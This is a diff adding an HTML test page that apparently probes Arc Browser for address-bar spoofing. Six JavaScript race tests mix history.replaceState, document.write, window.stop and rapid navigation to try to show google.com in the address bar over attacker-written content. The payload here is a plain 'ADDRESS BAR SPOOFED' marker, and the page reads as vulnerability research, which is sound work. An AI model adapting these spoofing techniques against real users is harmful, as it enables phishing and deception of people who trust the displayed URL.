@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Test 01 - Navigation Timing Race</title>
+<style>
+  body { font-family: system-ui; background: #111; color: #eee; padding: 20px; }
+  .test { background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 16px; margin: 12px 0; }
+  .test h3 { margin-top: 0; color: #7f5af0; }
+  button { background: #7f5af0; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; margin: 4px; font-size: 14px; }
+  button:hover { background: #6b46e5; }
+  code { background: #2a2a3e; padding: 2px 6px; border-radius: 4px; font-size: 13px; }
+  .desc { color: #aaa; font-size: 13px; margin: 8px 0; }
+  .target { color: #2cb67d; }
+  #log { background: #0a0a15; border: 1px solid #333; padding: 12px; margin-top: 16px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; }
+</style>
+</head>
+<body>
+<h2>01 - Navigation Timing Race Conditions</h2>
+<p class="desc">These tests exploit the gap between when navigation starts and when the address bar updates.
+The core idea: if we can <b>start a navigation</b> to a trusted URL but <b>control what actually renders</b>,
+the address bar shows the trusted URL while attacker content is displayed.</p>
+<p class="target">Target: Arc Browser iOS & Desktop</p>
+
+<!-- Test A: replaceState during onload -->
+<div class="test">
+  <h3>A. history.replaceState Race on New Window</h3>
+  <p class="desc">Opens a window to the target site. A race between the page loading and our script
+  calling <code>history.replaceState</code> might leave the address bar showing the target URL
+  while we control the history entry. On iOS, the address bar update can lag behind replaceState.</p>
+  <button onclick="testA()">Run Test A</button>
+</div>
+
+<!-- Test B: Rapid location assign + stop -->
+<div class="test">
+  <h3>B. location.assign + window.stop() Race</h3>
+  <p class="desc">Navigate to target URL then immediately call <code>window.stop()</code> and
+  <code>document.write()</code>. If stop() fires before the address bar updates but after navigation
+  begins, the bar may show the target URL with our content.</p>
+  <button onclick="testB()">Run Test B</button>
+</div>
+
+<!-- Test C: Double navigation race -->
+<div class="test">
+  <h3>C. Double Navigation Race</h3>
+  <p class="desc">Fire two navigations in rapid succession. First to attacker page (which renders our content),
+  second to target URL. The address bar may update to show the second URL while the first page's content
+  is still rendered due to the browser's navigation cancellation timing.</p>
+  <button onclick="testC()">Run Test C</button>
+</div>
+
+<!-- Test D: anchor click + pushState -->
+<div class="test">
+  <h3>D. Anchor Navigation + pushState Interleave</h3>
+  <p class="desc">Programmatically click an anchor to target URL while simultaneously calling
+  <code>history.pushState</code> with attacker content. The anchor click triggers address bar
+  update, but pushState may win the content race.</p>
+  <button onclick="testD()">Run Test D</button>
+</div>
+
+<!-- Test E: about:blank document.write then replaceState -->
+<div class="test">
+  <h3>E. about:blank + document.write + replaceState</h3>
+  <p class="desc">Open <code>about:blank</code>, write attacker content with <code>document.write</code>,
+  then call <code>history.replaceState</code> with a legitimate URL string. Some browsers update
+  the address bar from replaceState even on about:blank origins.</p>
+  <button onclick="testE()">Run Test E</button>
+</div>
+
+<!-- Test F: iframe srcdoc navigation escape -->
+<div class="test">
+  <h3>F. Rapid Window.open + location.replace Loop</h3>
+  <p class="desc">Opens a window and rapidly alternates between target URL and attacker URL using
+  <code>location.replace</code>. The rapid oscillation can confuse the address bar's debounce logic,
+  potentially freezing it on the target URL while attacker content is displayed.</p>
+  <button onclick="testF()">Run Test F</button>
+</div>
+
+<div id="log"></div>
+
+<script>
+const TARGET = 'https://www.google.com';
+const FAKE_CONTENT = `
+<html>
+<head><title>Google</title></head>
+<body style="font-family:arial;padding:40px;">
+<h1 style="color:red;font-size:48px;">ADDRESS BAR SPOOFED</h1>
+<p style="font-size:24px;">The address bar should show: ${TARGET}</p>
+<p style="font-size:24px;">But this is attacker-controlled content.</p>
+<p style="font-size:18px;color:#666;">If you see this with google.com in the address bar, it's a valid spoof.</p>
+</body></html>`;
+
+function log(msg) {
+  const el = document.getElementById('log');
+  el.textContent += `[${new Date().toISOString().slice(11,23)}] ${msg}\n`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// Test A: replaceState race
+function testA() {
+  log('Test A: Opening window to ' + TARGET);
+  const w = window.open(TARGET);
+
+  // Try replaceState at multiple timing intervals
+  const attempts = [0, 10, 50, 100, 200, 500, 1000];
+  attempts.forEach(delay => {
+    setTimeout(() => {
+      try {
+        // If same-origin policy allows (it won't for cross-origin, but test anyway)
+        w.history.replaceState({}, '', TARGET);
+        w.document.open();
+        w.document.write(FAKE_CONTENT);
+        w.document.close();
+        log(`Test A: replaceState succeeded at ${delay}ms`);
+      } catch(e) {
+        log(`Test A: ${delay}ms - ${e.message}`);
+      }
+    }, delay);
+  });
+}
+
+// Test B: location + stop race
+function testB() {
+  log('Test B: Opening about:blank then racing navigation vs stop');
+  const w = window.open('about:blank');
+
+  setTimeout(() => {
+    try {
+      w.document.open();
+      w.document.write(FAKE_CONTENT);
+      w.document.close();
+      log('Test B: Wrote content to about:blank');
+
+      // Now navigate to target and immediately stop
+      w.location.href = TARGET;
+
+      // Race: stop before network request completes but after bar updates
+      setTimeout(() => { try { w.stop(); log('Test B: stop() called'); } catch(e) { log('Test B stop: ' + e.message); } }, 1);
+      setTimeout(() => { try { w.stop(); } catch(e) {} }, 5);
+      setTimeout(() => { try { w.stop(); } catch(e) {} }, 10);
+      setTimeout(() => { try { w.stop(); } catch(e) {} }, 50);
+    } catch(e) {
+      log('Test B error: ' + e.message);
+    }
+  }, 100);
+}
+
+// Test C: Double navigation
+function testC() {
+  log('Test C: Double navigation race');
+  const w = window.open('about:blank');
+
+  setTimeout(() => {
+    try {
+      w.document.open();
+      w.document.write(FAKE_CONTENT);
+      w.document.close();
+      log('Test C: Content written');
+
+      // Navigate to target - bar should update
+      w.location.href = TARGET;
+
+      // Immediately navigate back to a data URI or about:blank
+      // The bar may stick on TARGET if the second nav cancels the first
+      // before the bar reverts
+      setTimeout(() => {
+        try {
+          w.location.href = 'about:blank';
+          setTimeout(() => {
+            try {
+              w.document.open();
+              w.document.write(FAKE_CONTENT);
+              w.document.close();
+              log('Test C: Re-wrote content after double nav');
+            } catch(e) { log('Test C rewrite: ' + e.message); }
+          }, 10);
+        } catch(e) { log('Test C second nav: ' + e.message); }
+      }, 1);
+    } catch(e) {
+      log('Test C error: ' + e.message);
+    }
+  }, 100);
+}
+
+// Test D: Anchor + pushState
+function testD() {
+  log('Test D: Anchor click + pushState race');
+
+  // Create a hidden anchor
+  const a = document.createElement('a');
+  a.href = TARGET;
+  a.target = '_blank';
+  a.rel = 'opener';
+  document.body.appendChild(a);
+
+  // Before clicking, set up a listener to race pushState
+  const origOpen = window.open;
+
+  a.click();
+  log('Test D: Anchor clicked, attempting pushState race');
+
+  // pushState on our own window with target URL display
+  try {
+    history.pushState({}, '', '/spoofed');
+    log('Test D: pushState called on opener');
+  } catch(e) {
+    log('Test D pushState: ' + e.message);
+  }
+
+  document.body.removeChild(a);
+}
+
+// Test E: about:blank write + replaceState
+function testE() {
+  log('Test E: about:blank + document.write + replaceState');
+  const w = window.open('about:blank');
+
+  setTimeout(() => {
+    try {
+      w.document.open();
+      w.document.write(FAKE_CONTENT);
+      w.document.close();
+      log('Test E: Content written to about:blank');
+
+      // Try to change the displayed URL via replaceState
+      // Some browsers allow replaceState to change the URL display even on about:blank
+      try {
+        w.history.replaceState({}, 'Google', TARGET);
+        log('Test E: replaceState to target succeeded!');
+      } catch(e) {
+        log('Test E replaceState: ' + e.message);
+
+        // Fallback: try with a relative path
+        try {
+          w.history.replaceState({}, 'Google', '/');
+          log('Test E: replaceState to / succeeded');
+        } catch(e2) {
+          log('Test E fallback: ' + e2.message);
+        }
+      }
+    } catch(e) {
+      log('Test E error: ' + e.message);
+    }
+  }, 200);
+}
+
+// Test F: Rapid oscillation
+function testF() {
+  log('Test F: Rapid navigation oscillation');
+  const w = window.open('about:blank');
+  let count = 0;
+
+  setTimeout(() => {
+    const interval = setInterval(() => {
+      try {
+        if (count % 2 === 0) {
+          w.location.replace(TARGET);
+        } else {
+          w.location.replace('about:blank');
+          setTimeout(() => {
+            try {
+              w.document.open();
+              w.document.write(FAKE_CONTENT);
+              w.document.close();
+            } catch(e) {}
+          }, 0);
+        }
+        count++;
+        if (count > 20) {
+          clearInterval(interval);
+          log('Test F: Oscillation complete (' + count + ' switches)');
+        }
+      } catch(e) {
+        clearInterval(interval);
+        log('Test F error at switch ' + count + ': ' + e.message);
+      }
+    }, 1);
+  }, 100);
+}
+</script>
+</body>
+</html>
